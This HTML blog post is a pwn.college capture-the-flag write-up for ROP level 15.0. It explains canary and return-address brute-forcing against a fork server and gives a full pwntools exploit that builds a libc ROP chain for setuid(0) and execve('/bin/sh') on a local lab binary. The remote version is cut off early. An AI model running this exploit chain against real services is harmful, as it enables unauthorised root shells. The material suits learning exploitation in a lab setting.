<!DOCTYPE html>
<html lang="en">
<head>
  
    <title>pwn.college - ROP 15.0 :: uint8_t* blog</title>
  
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<meta name="description" content="In this section, I will be solving the last challenge of the Return Oriented Programming module on pwn.college, this challenge was straight up diabolical but really enjoyable." />
<meta name="keywords" content="" />

  <meta name="robots" content="noodp" />

<link rel="canonical" href="https://blog.i-eat-sponges.ca/exploitation/babyrop_level15-0/" />






  
  
  
  
  
  <link rel="stylesheet" href="https://blog.i-eat-sponges.ca/styles.css">







  <link rel="shortcut icon" href="https://blog.i-eat-sponges.ca/img/theme-colors/red.png">
  <link rel="apple-touch-icon" href="https://blog.i-eat-sponges.ca/img/theme-colors/red.png">



<meta name="twitter:card" content="summary" />

  
    <meta name="twitter:site" content="uint8_t" />
  
    <meta name="twitter:creator" content="" />



<meta property="og:locale" content="en" />
<meta property="og:type" content="article" />
<meta property="og:title" content="pwn.college - ROP 15.0">
<meta property="og:description" content="In this section, I will be solving the last challenge of the Return Oriented Programming module on pwn.college, this challenge was straight up diabolical but really enjoyable." />
<meta property="og:url" content="https://blog.i-eat-sponges.ca/exploitation/babyrop_level15-0/" />
<meta property="og:site_name" content="uint8_t* blog" />

  
    <meta property="og:image" content="https://blog.i-eat-sponges.ca/img/favicon/red.png">
  

<meta property="og:image:width" content="1200">
<meta property="og:image:height" content="627">


  <meta property="article:published_time" content="2023-09-22 15:25:27 -0400 EDT" />












</head>
<body class="red">


<div class="container center headings--one-size">

  <header class="header">
  <div class="header__inner">
    <div class="header__logo">
      <a href="https://blog.i-eat-sponges.ca">
  <div class="logo">
    uint8_t*
  </div>
</a>

    </div>
    
      <ul class="menu menu--mobile">
  <li class="menu__trigger">Menu&nbsp;â–¾</li>
  <li>
    <ul class="menu__dropdown">
      
        
          <li><a href="/home/about/">About Me</a></li>
        
      
        
          <li><a href="/exploitation/">Exploitation</a></li>
        
      
        
          <li><a href="/malware/">Malware</a></li>
        
      
      
    </ul>
  </li>
</ul>

    
    
  </div>
  
    <nav class="navigation-menu">
  <ul class="navigation-menu__inner menu--desktop">
    
      
        
          <li><a href="/home/about/" >About Me</a></li>
        
      
        
          <li><a href="/exploitation/" >Exploitation</a></li>
        
      
        
          <li><a href="/malware/" >Malware</a></li>
        
      
      
    
  </ul>
</nav>

  
</header>


  <div class="content">
    
<article class="post">
  <h1 class="post-title">
    <a href="https://blog.i-eat-sponges.ca/exploitation/babyrop_level15-0/">pwn.college - ROP 15.0</a>
  </h1>
  <div class="post-meta"><time class="post-date">2023-09-22</time></div>

  
  


  

  <div class="post-content"><div>
        <p>Purely Diabolical, but fun. This challenge unfortunately took me about 24 hours in total, of just me fixing the exploit making little changes and more.</p>
<pre tabindex="0"><code>Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    Canary found
NX:       NX enabled
PIE:      PIE enabled
</code></pre><p>This challenge, was as hard as it can be, luckily for us the vulnerability is very obvious, like in most <code>pwn.college</code> challenges so far, so we just have to think of a way to successfully exploit this binary.</p>
<p>It&rsquo;s a fork server, so as you may expect, it&rsquo;ll involve bruteforcing of the canary, in order to overwrite past it.</p>
<p>We also can only use a single gadget, however we can bruteforce the return address of main.</p>
<p>This is shitty because main returns into <code>libc</code>, so we have to <code>ROP</code> from there.</p>
<p>What i did was, i chose an offset in <code>libc</code> then i bruteforce the return address starting at the second last-byte all the way down to the first-byte.</p>
<p>For example, 0x<strong>007fffffffffd0</strong>c8, we bruteforce starting from the last byte in bold, all the way to the first one.</p>
<p>Then i subtracted the offset from the bruteforced value, and this results in the base address of <code>libc</code>.</p>
<p>Once we get the base address of <code>libc</code> it&rsquo;s winner winner chicken dinner.</p>
<p>One problem i had when solving this challenge, is that the binary mentions it only accepts a single connection at a time, sometimes when returning at a random spot in <code>libc</code>, the process would either restart or hang.</p>
<p>This is bad because it stops us from connecting to the vulnerable server, so we have to kill the child processes everytime we don&rsquo;t make the program exit or crash.</p>
<h2 id="solution-local">Solution (local)<a href="#solution-local" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This exploit template was generated via:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ pwn template ./babyrop_level15.0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> psutil
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;error&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;./babyrop_level15.0&#39;</span>)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Many built-in settings can be controlled on the command-line and show up</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># in &#34;args&#34;.  For example, to dump all data sent/received, and disable ASLR</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># for all created processes...</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py DEBUG NOASLR</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">get_process</span>():
</span></span><span style="display:flex;"><span>    process_name <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;babyrop_level15.0&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">for</span> process <span style="color:#f92672">in</span> psutil<span style="color:#f92672">.</span>process_iter([<span style="color:#e6db74">&#39;pid&#39;</span>, <span style="color:#e6db74">&#39;name&#39;</span>]):
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">try</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> process<span style="color:#f92672">.</span>info[<span style="color:#e6db74">&#39;name&#39;</span>] <span style="color:#f92672">==</span> process_name:
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">return</span> process<span style="color:#f92672">.</span>info[<span style="color:#e6db74">&#39;pid&#39;</span>]
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">except</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">def</span> <span style="color:#a6e22e">start</span>(argv<span style="color:#f92672">=</span>[], <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw):
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">&#39;&#39;&#39;Start the exploit against the target.&#39;&#39;&#39;</span>
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> args<span style="color:#f92672">.</span>GDB:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> gdb<span style="color:#f92672">.</span>debug([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, gdbscript<span style="color:#f92672">=</span>gdbscript, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">else</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> process([exe<span style="color:#f92672">.</span>path] <span style="color:#f92672">+</span> argv, <span style="color:#f92672">*</span>a, <span style="color:#f92672">**</span>kw)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Specify your GDB script here for debugging</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># GDB will be launched if the exploit is run via e.g.</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># ./exploit.py GDB</span>
</span></span><span style="display:flex;"><span>gdbscript <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;&#39;&#39;
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">tbreak main
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">continue
</span></span></span><span style="display:flex;"><span><span style="color:#e6db74">&#39;&#39;&#39;</span><span style="color:#f92672">.</span>format(<span style="color:#f92672">**</span>locals())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#                    EXPLOIT GOES HERE</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#===========================================================</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Arch:     amd64-64-little</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># RELRO:    Full RELRO</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Stack:    Canary found</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># NX:       NX enabled</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># PIE:      PIE enabled</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>canary <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">1</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-c&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;canary.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>            canary <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(file<span style="color:#f92672">.</span>readline())
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using canary from file canary.txt&#34;</span>)
</span></span><span style="display:flex;"><span>            file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">1</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bruteforcing byte </span><span style="color:#e6db74">{</span>len(canary) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> of canary with </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>canary[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, p8(y)
</span></span><span style="display:flex;"><span>            ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                <span style="color:#75715e"># start second check</span>
</span></span><span style="display:flex;"><span>                io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>                output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">if</span> <span style="color:#f92672">not</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                    print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Found value </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> at offset </span><span style="color:#e6db74">{</span>len(canary) <span style="color:#f92672">+</span> <span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>                    io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                    canary <span style="color:#f92672">+=</span> p8(y)
</span></span><span style="display:flex;"><span>                    <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(canary) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using Canary: </span><span style="color:#e6db74">{</span>canary[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Using Canary: </span><span style="color:#e6db74">{</span>canary<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>print(canary)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;canary.txt&#34;</span>, <span style="color:#e6db74">&#34;w+&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(canary<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\xb6\x7c</span><span style="color:#e6db74">&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">&#34;STARTING RET BRUTE PRESS A KEY&#34;</span>)
</span></span><span style="display:flex;"><span>input()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(sys<span style="color:#f92672">.</span>argv) <span style="color:#f92672">&gt;=</span> <span style="color:#ae81ff">3</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> sys<span style="color:#f92672">.</span>argv[<span style="color:#ae81ff">2</span>] <span style="color:#f92672">==</span> <span style="color:#e6db74">&#34;-r&#34;</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;ret.txt&#34;</span>, <span style="color:#e6db74">&#34;r&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>            ret_val <span style="color:#f92672">=</span> bytes<span style="color:#f92672">.</span>fromhex(file<span style="color:#f92672">.</span>readline())
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">2</span>:
</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">while</span> <span style="color:#66d9ef">True</span>:
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">for</span> y <span style="color:#f92672">in</span> range(<span style="color:#ae81ff">0</span>, <span style="color:#ae81ff">256</span>):
</span></span><span style="display:flex;"><span>            print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;Bruteforcing offset </span><span style="color:#e6db74">{</span>len(ret_val)<span style="color:#f92672">+</span><span style="color:#ae81ff">1</span><span style="color:#e6db74">}</span><span style="color:#e6db74"> of return value with </span><span style="color:#e6db74">{</span>p8(y)<span style="color:#e6db74">}</span><span style="color:#e6db74"> :: </span><span style="color:#e6db74">{</span>ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>            p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>                <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x8</span>,
</span></span><span style="display:flex;"><span>                ret_val, p8(y)
</span></span><span style="display:flex;"><span>            ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>            t <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvuntil(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Goodbye!</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;stack smashing&#34;</span> <span style="color:#f92672">in</span> t:
</span></span><span style="display:flex;"><span>                print(<span style="color:#e6db74">&#34;odd&#34;</span>)
</span></span><span style="display:flex;"><span>            output <span style="color:#f92672">=</span> io<span style="color:#f92672">.</span>recvall(timeout<span style="color:#f92672">=</span><span style="color:#ae81ff">4</span>)
</span></span><span style="display:flex;"><span>            print(output)
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">if</span> <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;Welcome&#34;</span> <span style="color:#f92672">in</span> output:
</span></span><span style="display:flex;"><span>                ret_val <span style="color:#f92672">+=</span> p8(y)
</span></span><span style="display:flex;"><span>                io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>                parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>                    child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>                <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>            io<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>            parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>                child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> len(ret_val) <span style="color:#f92672">==</span> <span style="color:#ae81ff">8</span>:
</span></span><span style="display:flex;"><span>            <span style="color:#66d9ef">break</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> ret_val<span style="color:#f92672">.</span>ljust(<span style="color:#ae81ff">8</span>, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;</span><span style="color:#ae81ff">\x00</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(ret_val)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#print(f&#34;RETURN VALUE: {ret_val.hex()}&#34;)</span>
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;RETURN VALUE: </span><span style="color:#e6db74">{</span>ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">with</span> open(<span style="color:#e6db74">&#34;ret.txt&#34;</span>, <span style="color:#e6db74">&#34;w+&#34;</span>) <span style="color:#66d9ef">as</span> file:
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>write(ret_val<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>    file<span style="color:#f92672">.</span>close()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>print(ret_val)
</span></span><span style="display:flex;"><span>print(ret_val<span style="color:#f92672">.</span>hex())
</span></span><span style="display:flex;"><span>ret_val <span style="color:#f92672">=</span> int(ret_val[::<span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>]<span style="color:#f92672">.</span>hex()[<span style="color:#ae81ff">2</span>:], <span style="color:#ae81ff">16</span>) <span style="color:#f92672">-</span> <span style="color:#ae81ff">0x27cb6</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#ret_val = ret_val - 0x24013</span>
</span></span><span style="display:flex;"><span>libc <span style="color:#f92672">=</span> ELF(<span style="color:#e6db74">&#34;/usr/lib/libc.so.6&#34;</span>)
</span></span><span style="display:flex;"><span>print(<span style="color:#e6db74">f</span><span style="color:#e6db74">&#34;libc base is at </span><span style="color:#e6db74">{</span>hex(ret_val)<span style="color:#e6db74">}</span><span style="color:#e6db74">&#34;</span>)
</span></span><span style="display:flex;"><span>libc<span style="color:#f92672">.</span>address <span style="color:#f92672">=</span> ret_val
</span></span><span style="display:flex;"><span>rop <span style="color:#f92672">=</span> ROP(libc)
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>parent <span style="color:#f92672">=</span> psutil<span style="color:#f92672">.</span>Process(get_process())
</span></span><span style="display:flex;"><span><span style="color:#66d9ef">for</span> child <span style="color:#f92672">in</span> parent<span style="color:#f92672">.</span>children(recursive<span style="color:#f92672">=</span><span style="color:#66d9ef">True</span>):
</span></span><span style="display:flex;"><span>    child<span style="color:#f92672">.</span>kill()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io <span style="color:#f92672">=</span> remote(<span style="color:#e6db74">&#34;127.0.0.1&#34;</span>, <span style="color:#ae81ff">1337</span>)
</span></span><span style="display:flex;"><span>p <span style="color:#f92672">=</span> [
</span></span><span style="display:flex;"><span>    <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;A&#34;</span> <span style="color:#f92672">*</span> <span style="color:#ae81ff">0x28</span>, canary, <span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;B&#34;</span><span style="color:#f92672">*</span><span style="color:#ae81ff">0x8</span>,
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>    p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>setuid),
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rdi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(next(libc<span style="color:#f92672">.</span>search(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;/bin/sh&#34;</span>))),
</span></span><span style="display:flex;"><span>    p64(rop<span style="color:#f92672">.</span>find_gadget([<span style="color:#e6db74">&#39;pop rsi&#39;</span>, <span style="color:#e6db74">&#39;ret&#39;</span>])[<span style="color:#ae81ff">0</span>]), p64(<span style="color:#ae81ff">0</span>),
</span></span><span style="display:flex;"><span>    p64(libc<span style="color:#f92672">.</span>sym<span style="color:#f92672">.</span>execve)
</span></span><span style="display:flex;"><span>    ]
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>send(<span style="color:#e6db74">b</span><span style="color:#e6db74">&#34;&#34;</span><span style="color:#f92672">.</span>join(p))
</span></span><span style="display:flex;"><span>io<span style="color:#f92672">.</span>interactive()
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># shellcode = asm(shellcraft.sh())</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># payload = fit({</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     32: 0xdeadbeef,</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#     &#39;iaaa&#39;: [1, 2, &#39;Hello&#39;, 3]</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># }, length=128)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># io.send(payload)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># flag = io.recv(...)</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># log.success(flag)</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e">#io.interactive()</span>
</span></span></code></pre></div><h2 id="solution-remote">Solution (remote)<a href="#solution-remote" class="hanchor" ariaLabel="Anchor">&#8983;</a> </h2>
<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-python" data-lang="python"><span style="display:flex;"><span><span style="color:#75715e">#!/usr/bin/env python3</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># -*- coding: utf-8 -*-</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># This exploit template was generated via:</span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># $ pwn template ./babyrop_level15.0</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">from</span> pwn <span style="color:#f92672">import</span> <span style="color:#f92672">*</span>
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> sys<span style="color:#f92672">,</span> os
</span></span><span style="display:flex;"><span><span style="color:#f92672">import</span> psutil
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span>context<span style="color:#f92672">.</span>log_level <span style="color:#f92672">=</span> <span style="color:#e6db74">&#34;error&#34;</span>
</span></span><span style="display:flex;"><span>
</span></span><span style="display:flex;"><span><span style="color:#75715e"># Set up pwntools for the correct architecture</span>
</span></span><span style="display:flex;"><span>exe <span style="color:#f92672">=</span> context<span style="color:#f92672">.</span>binary <span style="color:#f92672">=</span> ELF(args<span style="color:#f92672">.</span>EXE <span style="color:#f92672">or</span> <span style="color:#e6db74">&#39;/challenge/babyrop_level15.0&#39;</span>)
</span></span><span style="display:flex;"><span>
